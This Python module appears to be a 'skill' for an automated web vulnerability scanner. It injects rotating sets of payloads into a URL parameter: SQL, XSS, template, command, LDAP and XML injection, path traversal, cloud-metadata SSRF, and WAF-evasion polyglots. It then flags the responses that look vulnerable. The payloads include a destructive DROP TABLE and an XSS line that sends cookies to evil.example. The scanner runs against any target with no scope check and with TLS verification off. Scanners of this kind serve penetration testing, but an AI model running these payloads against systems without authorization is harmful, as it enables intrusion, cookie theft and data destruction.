"""Skill: test_injection — SQLi/XSS/SSTI/CMDi on a URL+parameter."""
from __future__ import annotations
import asyncio
import logging
import re
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger(__name__)

# Payloads grouped by type with detection signatures
PAYLOADS: list[dict] = [
    # SQL Injection — error-based
    {"type": "sqli", "payload": "'", "detect": ["sql", "sqlite", "mysql", "postgres", "syntax error", "ORA-", "unclosed quotation"]},
    {"type": "sqli", "payload": "' OR 1=1--", "detect": ["sql"]},
    {"type": "sqli", "payload": "1' ORDER BY 100--", "detect": ["sql", "order"]},
    {"type": "sqli", "payload": "' UNION SELECT NULL--", "detect": ["sql"]},
    {"type": "sqli", "payload": "1; DROP TABLE test--", "detect": ["sql"]},
    {"type": "sqli", "payload": "' AND 1=CONVERT(int,(SELECT @@version))--", "detect": ["convert", "sql"]},
    {"type": "sqli", "payload": "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", "detect": []},  # time-based
    # SQL Injection — blind (response size diff)
    {"type": "sqli_blind", "payload": "' AND '1'='1", "detect": []},
    {"type": "sqli_blind", "payload": "' AND '1'='2", "detect": []},
    # XSS — reflected
    {"type": "xss", "payload": "<script>alert(1)</script>", "detect": ["<script>alert(1)</script>"]},
    {"type": "xss", "payload": "<img src=x onerror=alert(1)>", "detect": ["onerror=alert"]},
    {"type": "xss", "payload": "<iframe src=javascript:alert(1)>", "detect": ["<iframe"]},
    {"type": "xss", "payload": "\"><script>alert(1)</script>", "detect": ["<script>"]},
    {"type": "xss", "payload": "'-alert(1)-'", "detect": ["alert(1)"]},
    {"type": "xss", "payload": "<svg onload=alert(1)>", "detect": ["<svg"]},
    {"type": "xss", "payload": "{{7*7}}", "detect": ["49"]},  # also SSTI
    # SSTI
    {"type": "ssti", "payload": "${7*7}", "detect": ["49"]},
    {"type": "ssti", "payload": "{{config}}", "detect": ["SECRET_KEY", "config"]},
    {"type": "ssti", "payload": "<%= 7*7 %>", "detect": ["49"]},
    {"type": "ssti", "payload": "{%import os%}{{os.popen('id').read()}}", "detect": ["uid="]},
    # Command Injection
    {"type": "cmdi", "payload": ";id", "detect": ["uid="]},
    {"type": "cmdi", "payload": "|id", "detect": ["uid="]},
    {"type": "cmdi", "payload": "`id`", "detect": ["uid="]},
    {"type": "cmdi", "payload": "$(id)", "detect": ["uid="]},
    {"type": "cmdi", "payload": ";cat /etc/passwd", "detect": ["root:"]},
    # Path Traversal
    {"type": "path_traversal", "payload": "../../etc/passwd", "detect": ["root:"]},
    {"type": "path_traversal", "payload": "....//....//etc/passwd", "detect": ["root:"]},
    {"type": "path_traversal", "payload": "%2e%2e%2f%2e%2e%2fetc/passwd", "detect": ["root:"]},
    # SSRF
    {"type": "ssrf", "payload": "http://localhost/", "detect": []},
    {"type": "ssrf", "payload": "http://169.254.169.254/latest/meta-data/", "detect": ["ami-", "instance"]},
    # NoSQL
    {"type": "nosql", "payload": "{'$ne': null}", "detect": []},
    {"type": "nosql", "payload": "[$ne]=1", "detect": []},
    # --- AUTO-UPDATED PAYLOADS BELOW (managed by growth pipeline) ---
]

# Round 2 — blind/time-based + second-order. Used when round 1 came up
# clean but we still want to probe deeper. These have no obvious detect
# string and rely on behaviour (sleep timing, boolean diff, stacked queries).
PAYLOADS_ROUND2: list[dict] = [
    # Time-based blind SQLi — detector is response latency, tracked
    # in test_payload via elapsed comparison
    {"type": "sqli_time", "payload": "' AND SLEEP(3)--", "detect": []},
    {"type": "sqli_time", "payload": "'; WAITFOR DELAY '0:0:3'--", "detect": []},
    {"type": "sqli_time", "payload": "' OR pg_sleep(3)--", "detect": []},
    {"type": "sqli_time", "payload": "';select pg_sleep(3)--", "detect": []},
    # Stacked/second-order SQLi
    {"type": "sqli", "payload": "1); SELECT version()--", "detect": ["postgres", "mysql", "mariadb"]},
    {"type": "sqli", "payload": "' UNION SELECT 1,@@version,3--", "detect": ["mariadb", "mysql"]},
    {"type": "sqli", "payload": "' UNION SELECT table_name FROM information_schema.tables--", "detect": ["information_schema"]},
    # Out-of-band / DNS exfil probe (response-based only — actual DNS
    # exfil needs Burp Collab; here we just check if the target reflects)
    {"type": "sqli_oob", "payload": "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@hostname),'.test.invalid\\\\a'))--", "detect": []},
    # XSS bypass variants — handle common filters
    {"type": "xss", "payload": "<ScRiPt>alert(1)</sCrIpT>", "detect": ["<scr"]},
    {"type": "xss", "payload": "javascript:alert(1)", "detect": ["javascript:alert"]},
    {"type": "xss", "payload": "<img/src='x'/onerror=alert(1)>", "detect": ["onerror"]},
    {"type": "xss", "payload": "<a href=\"javascript:alert(1)\">x</a>", "detect": ["javascript:"]},
    {"type": "xss", "payload": "<body onload=alert(1)>", "detect": ["onload="]},
    # SSTI — additional engines
    {"type": "ssti", "payload": "#{7*7}", "detect": ["49"]},           # Ruby ERB
    {"type": "ssti", "payload": "*{7*7}", "detect": ["49"]},           # Thymeleaf
    {"type": "ssti", "payload": "@(7*7)", "detect": ["49"]},           # Razor
    # CRLF injection — shows up as header split
    {"type": "crlf", "payload": "%0d%0aSet-Cookie: injected=1", "detect": []},
    {"type": "crlf", "payload": "%0aLocation: http://evil.example/", "detect": []},
    # XXE probe (works on XML parsers)
    {"type": "xxe", "payload": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY y SYSTEM \"file:///etc/passwd\">]><x>&y;</x>", "detect": ["root:", "bin:"]},
    # LDAP
    {"type": "ldap", "payload": "*))(|(uid=*", "detect": []},
    {"type": "ldap", "payload": "admin)(|(password=*))", "detect": []},
]

# Round 3 — WAF evasion + polyglots. Last-resort payloads used when
# rounds 1 & 2 both came up clean. Encoding, case-mixing, polyglot
# strings that cover multiple contexts with one payload.
PAYLOADS_ROUND3: list[dict] = [
    # Polyglots — single payload, multiple contexts
    {"type": "sqli", "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "detect": ["alert()"]},
    {"type": "xss", "payload": "'\"><svg onload=alert(String.fromCharCode(88,83,83))>", "detect": ["alert(", "svg"]},
    # URL-encoded / double-encoded
    {"type": "sqli", "payload": "%27%20OR%201%3D1--", "detect": ["sql", "error"]},
    {"type": "sqli", "payload": "%2527%2520OR%25201%253D1--", "detect": ["sql"]},
    {"type": "xss", "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "detect": ["<script>"]},
    # Unicode bypass
    {"type": "xss", "payload": "<\u200Bscript>alert(1)</script>", "detect": ["alert"]},
    # Comment-based WAF evasion for SQLi
    {"type": "sqli", "payload": "'/**/OR/**/1=1--", "detect": ["sql"]},
    {"type": "sqli", "payload": "'%0AOR%0A1=1--", "detect": ["sql"]},
    # Null byte
    {"type": "path_traversal", "payload": "../../etc/passwd%00.jpg", "detect": ["root:"]},
    {"type": "path_traversal", "payload": "..;/..;/etc/passwd", "detect": ["root:"]},
    # Command injection with encoding
    {"type": "cmdi", "payload": "$IFS$9id", "detect": ["uid="]},
    {"type": "cmdi", "payload": "{id,}", "detect": ["uid="]},
    {"type": "cmdi", "payload": "id${IFS}", "detect": ["uid="]},
    # Header injection via User-Agent/Referer style
    {"type": "xss", "payload": "\"><img src=x onerror=fetch('//evil.example/?'+document.cookie)>", "detect": ["onerror"]},
    # Template polyglots
    {"type": "ssti", "payload": "{{''.__class__.__mro__[2].__subclasses__()}}", "detect": ["subclass", "class"]},
    {"type": "ssti", "payload": "${{<%[%'\"}}%\\.", "detect": []},
]


def _payloads_for_round(r: int) -> list[dict]:
    """Select payload set by rotation round.

    Round 1 (default): classic/error-based — highest signal, cheapest.
    Round 2: blind/time-based + filter bypass — used on second attempt.
    Round 3: WAF evasion + polyglots — last-resort.
    Round >=4 or <=0: union of all three (exhaustive).
    """
    if r == 1:
        return PAYLOADS
    if r == 2:
        return PAYLOADS_ROUND2
    if r == 3:
        return PAYLOADS_ROUND3
    return PAYLOADS + PAYLOADS_ROUND2 + PAYLOADS_ROUND3


async def execute(url: str, param_name: str | None = None, round: int = 1,
                  **kwargs: Any) -> dict[str, Any]:
    """Test injection on a URL with query parameter.

    If url contains ?param=value, tests on that param.
    If param_name given, injects into that specific param.

    `round` selects the payload set (1=classic, 2=blind/time/bypass,
    3=WAF evasion/polyglots, >=4 or <=0=all combined). Scan_loop passes
    an incrementing `round` when re-queueing the skill against the same
    endpoint so the second/third attempt isn't a no-op on a WAF-protected
    target.

    Returns:
        {
            "vulnerable": bool,
            "findings": [{"type": "sqli", "payload": "...", "evidence": "...", "severity": "..."}, ...],
            "tested": int,
            "url": str,
            "round": int,
        }
    """
    import httpx
    import time

    _payloads = _payloads_for_round(round)
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    # Find target parameter
    if param_name and param_name in params:
        target_param = param_name
    elif params:
        target_param = list(params.keys())[0]
    else:
        # No query param — try common ones
        target_param = "q"
        params = {"q": [""]}
        parsed = parsed._replace(query="q=")

    # Get baseline response
    async with httpx.AsyncClient(timeout=10, verify=False) as c:
        try:
            base_r = await c.get(url)
            baseline_status = base_r.status_code
            baseline_size = len(base_r.content)
            baseline_body = base_r.text.lower()
        except Exception as e:
            return {"vulnerable": False, "findings": [], "tested": 0, "url": url, "error": str(e)}

        findings: list[dict] = []
        blind_sizes: dict[str, int] = {}
        tested = 0

        sem = asyncio.Semaphore(10)

        async def test_payload(p: dict) -> None:
            nonlocal tested
            async with sem:
                tested += 1
                new_params = dict(params)
                original_val = new_params[target_param][0] if new_params[target_param] else ""
                new_params[target_param] = [original_val + p["payload"]]
                query = urlencode({k: v[0] for k, v in new_params.items()})
                test_url = urlunparse(parsed._replace(query=query))

                _t0 = time.monotonic()
                try:
                    r = await c.get(test_url, timeout=10)
                except Exception:
                    return
                _elapsed = time.monotonic() - _t0

                body = r.text.lower()
                size = len(r.content)

                # Time-based blind SQLi — a consistent 3s+ delay with
                # a SLEEP/WAITFOR/pg_sleep payload is a strong signal.
                if p["type"] == "sqli_time" and _elapsed >= 2.5:
                    findings.append({
                        "type": "sqli_time",
                        "payload": p["payload"],
                        "param": target_param,
                        "evidence": f"Request took {_elapsed:.2f}s (payload injected SLEEP/WAITFOR)",
                        "response_preview": r.text[:300],
                        "severity": "critical",
                    })
                    logger.info("time-based sqli: %s on %s (%.2fs)", p["payload"][:40], target_param, _elapsed)
                    return

                # Track blind SQLi size differences
                if p["type"] == "sqli_blind":
                    blind_sizes[p["payload"]] = size
                    return

                # Check for error-based detection
                for sig in p["detect"]:
                    if sig.lower() in body:
                        severity = {
                            "sqli": "critical", "sqli_time": "critical",
                            "sqli_oob": "critical",
                            "xss": "high", "ssti": "critical",
                            "cmdi": "critical", "path_traversal": "high",
                            "ssrf": "high", "nosql": "high",
                            "crlf": "medium", "xxe": "critical", "ldap": "high",
                        }.get(p["type"], "medium")

                        findings.append({
                            "type": p["type"],
                            "payload": p["payload"],
                            "param": target_param,
                            "evidence": f"Status {r.status_code}, matched '{sig}' in response",
                            "response_preview": r.text[:300],
                            "severity": severity,
                        })
                        logger.info("injection found: %s on %s with %s", p["type"], target_param, p["payload"][:30])
                        return

                # Check for interesting status code changes
                if r.status_code == 500 and baseline_status != 500:
                    findings.append({
                        "type": p["type"],
                        "payload": p["payload"],
                        "param": target_param,
                        "evidence": f"Payload caused 500 error (baseline was {baseline_status})",
                        "response_preview": r.text[:300],
                        "severity": "medium",
                    })

                # Check for XSS reflection
                if p["type"] == "xss" and p["payload"].lower() in body:
                    findings.append({
                        "type": "xss_reflected",
                        "payload": p["payload"],
                        "param": target_param,
                        "evidence": "Payload reflected in response body",
                        "response_preview": r.text[:300],
                        "severity": "high",
                    })

        await asyncio.gather(*[test_payload(p) for p in _payloads])

        # Analyze blind SQLi
        if len(blind_sizes) >= 2:
            sizes = list(blind_sizes.values())
            if max(sizes) - min(sizes) > 50:
                findings.append({
                    "type": "sqli_blind",
                    "payload": "boolean-based blind",
                    "param": target_param,
                    "evidence": f"Response size delta: {dict(blind_sizes)}",
                    "severity": "critical",
                })

    # Deduplicate findings by type
    seen_types: set[str] = set()
    unique_findings: list[dict] = []
    for f in findings:
        key = f"{f['type']}:{f['param']}"
        if key not in seen_types:
            seen_types.add(key)
            unique_findings.append(f)

    return {
        "vulnerable": len(unique_findings) > 0,
        "findings": unique_findings,
        "tested": tested,
        "url": url,
        "param": target_param,
        "round": round,
    }
